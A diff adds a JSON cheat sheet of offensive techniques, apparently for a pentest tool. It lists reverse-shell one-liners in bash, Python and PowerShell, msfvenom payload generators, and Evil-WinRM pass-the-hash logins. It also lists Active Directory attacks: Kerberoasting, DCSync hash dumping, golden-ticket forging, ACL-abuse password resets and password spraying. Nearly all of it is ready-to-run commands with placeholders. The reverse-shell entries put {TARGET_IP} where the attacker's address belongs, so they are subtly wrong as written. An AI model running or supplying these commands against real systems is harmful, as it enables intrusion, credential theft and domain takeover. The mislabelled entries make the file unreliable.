@@ -1,0 +1,35 @@
+[
+  {
+    "category": "Shells & Payloads",
+    "techniques": [
+      {"id":"sh_1","name":"Netcat Listener","purpose":"Catch incoming reverse shell","when_to_use":"Before triggering reverse shell payload","command":"nc -lvnp 4444","tags":["shell","netcat","listener"]},
+      {"id":"sh_2","name":"Bash Reverse Shell","purpose":"Send reverse shell from Linux target","when_to_use":"When bash is available on target","command":"bash -i >& /dev/tcp/{TARGET_IP}/4444 0>&1","tags":["shell","bash","reverse"]},
+      {"id":"sh_3","name":"Python3 Reverse Shell","purpose":"Reverse shell via Python3","when_to_use":"When Python3 is available on target","command":"python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect(('{TARGET_IP}',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh'])\"","tags":["shell","python","reverse"]},
+      {"id":"sh_4","name":"PowerShell Reverse Shell","purpose":"Reverse shell from Windows","when_to_use":"When PowerShell is available on Windows target","command":"powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{TARGET_IP}',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=[text.encoding]::ASCII.GetBytes($r2);$s.Write($sb,0,$sb.Length)}\"","tags":["shell","powershell","reverse"]},
+      {"id":"sh_5","name":"msfvenom Windows x64 EXE","purpose":"Generate Windows reverse shell payload","when_to_use":"When you can execute a binary on Windows","command":"msfvenom -p windows/x64/shell_reverse_tcp LHOST={TARGET_IP} LPORT=4444 -f exe -o shell.exe","tags":["msfvenom","payload","windows"]},
+      {"id":"sh_6","name":"msfvenom PHP Webshell","purpose":"Generate PHP reverse shell payload","when_to_use":"When you can upload PHP files","command":"msfvenom -p php/reverse_php LHOST={TARGET_IP} LPORT=4444 -f raw -o shell.php","tags":["msfvenom","payload","php"]},
+      {"id":"sh_7","name":"msfvenom Linux ELF","purpose":"Generate Linux reverse shell binary","when_to_use":"When you can execute binaries on Linux","command":"msfvenom -p linux/x64/shell_reverse_tcp LHOST={TARGET_IP} LPORT=4444 -f elf -o shell.elf && chmod +x shell.elf","tags":["msfvenom","payload","linux"]},
+      {"id":"sh_8","name":"msfvenom ASP Webshell","purpose":"Generate ASP reverse shell for IIS","when_to_use":"When you can upload to IIS server","command":"msfvenom -p windows/shell_reverse_tcp LHOST={TARGET_IP} LPORT=4444 -f asp -o shell.asp","tags":["msfvenom","payload","asp"]},
+      {"id":"sh_9","name":"Upgrade Shell to TTY","purpose":"Get fully interactive shell","when_to_use":"After catching a basic reverse shell","command":"python3 -c 'import pty;pty.spawn(\"/bin/bash\")' && export TERM=xterm","tags":["shell","tty","upgrade"]},
+      {"id":"sh_10","name":"Full TTY Upgrade (stty)","purpose":"Get fully interactive shell with Ctrl+C support","when_to_use":"After python pty spawn","command":"# In reverse shell: python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n# Press Ctrl+Z, then in local terminal:\nstty raw -echo; fg\n# Then in shell:\nexport TERM=xterm; stty rows 40 cols 200","tags":["shell","tty","upgrade"]},
+      {"id":"sh_11","name":"Evil-WinRM Shell","purpose":"Get PowerShell shell via WinRM","when_to_use":"When WinRM (5985) is open and you have credentials","command":"evil-winrm -i {TARGET_IP} -u {USERNAME} -p {PASSWORD}","tags":["shell","winrm","windows"]},
+      {"id":"sh_12","name":"Evil-WinRM with Hash","purpose":"WinRM shell using NTLM hash","when_to_use":"When you have NTLM hash","command":"evil-winrm -i {TARGET_IP} -u {USERNAME} -H {PASSWORD}","tags":["shell","winrm","pth"]}
+    ]
+  },
+  {
+    "category": "Active Directory",
+    "techniques": [
+      {"id":"ad_1","name":"BloodHound Collection (SharpHound)","purpose":"Map AD attack paths and relationships","when_to_use":"After getting domain user credentials","command":"./SharpHound.exe -c All --zipfilename bloodhound.zip","tags":["ad","bloodhound"]},
+      {"id":"ad_2","name":"BloodHound Python (Remote)","purpose":"Collect AD data without uploading to target","when_to_use":"When you have domain creds and network access","command":"bloodhound-python -u {USERNAME} -p {PASSWORD} -d {TARGET_DOMAIN} -dc {TARGET_IP} -c All","tags":["ad","bloodhound","python"]},
+      {"id":"ad_3","name":"Kerberoasting","purpose":"Request TGS tickets for offline cracking","when_to_use":"When you have any domain user account","command":"impacket-GetUserSPNs {TARGET_DOMAIN}/{USERNAME}:{PASSWORD} -dc-ip {TARGET_IP} -request -outputfile kerberoast.txt","tags":["ad","kerberoast","kerberos"]},
+      {"id":"ad_4","name":"ASREPRoasting","purpose":"Get hashes for users without pre-auth required","when_to_use":"When you have a user list but no passwords","command":"impacket-GetNPUsers {TARGET_DOMAIN}/ -usersfile users.txt -dc-ip {TARGET_IP} -format hashcat -outputfile asrep.txt","tags":["ad","asrep","kerberos"]},
+      {"id":"ad_5","name":"DCSync Attack","purpose":"Dump all domain hashes as if you were a DC","when_to_use":"When you have DCSync rights (Domain Admin or delegated)","command":"impacket-secretsdump {TARGET_DOMAIN}/{USERNAME}:{PASSWORD}@{TARGET_IP} -just-dc-ntlm","tags":["ad","dcsync","hashes"]},
+      {"id":"ad_6","name":"Pass-the-Ticket (Impacket)","purpose":"Use Kerberos ticket for lateral movement","when_to_use":"After extracting a TGT/TGS ticket","command":"export KRB5CCNAME=ticket.ccache && impacket-psexec -k -no-pass {TARGET_DOMAIN}/{USERNAME}@{TARGET_IP}","tags":["ad","ptt","kerberos"]},
+      {"id":"ad_7","name":"Enumerate AD Users (CME)","purpose":"List all domain users","when_to_use":"With valid domain credentials","command":"crackmapexec smb {TARGET_IP} -u {USERNAME} -p {PASSWORD} --users","tags":["ad","cme","enum"]},
+      {"id":"ad_8","name":"Find Domain Admins","purpose":"List members of Domain Admins group","when_to_use":"After getting domain user access","command":"crackmapexec smb {TARGET_IP} -u {USERNAME} -p {PASSWORD} --groups 'Domain Admins'","tags":["ad","cme","enum"]},
+      {"id":"ad_9","name":"Golden Ticket Attack","purpose":"Forge Kerberos TGT for any user (persistence)","when_to_use":"After obtaining KRBTGT hash","command":"impacket-ticketer -nthash {PASSWORD} -domain-sid S-1-5-21-XXXX -domain {TARGET_DOMAIN} Administrator && export KRB5CCNAME=Administrator.ccache","tags":["ad","golden","kerberos"]},
+      {"id":"ad_10","name":"ACL Abuse - GenericAll","purpose":"Exploit GenericAll permission to reset password","when_to_use":"When BloodHound shows GenericAll on a user","command":"net rpc password {USERNAME} 'NewP@ss123' -U {TARGET_DOMAIN}/{USERNAME}%{PASSWORD} -S {TARGET_IP}","tags":["ad","acl","abuse"]},
+      {"id":"ad_11","name":"LDAP Password Spray","purpose":"Spray password against all AD users","when_to_use":"When you have a user list and a candidate password","command":"crackmapexec ldap {TARGET_IP} -u users.txt -p '{PASSWORD}' --continue-on-success","tags":["ad","spray","ldap"]}
+    ]
+  }
+]
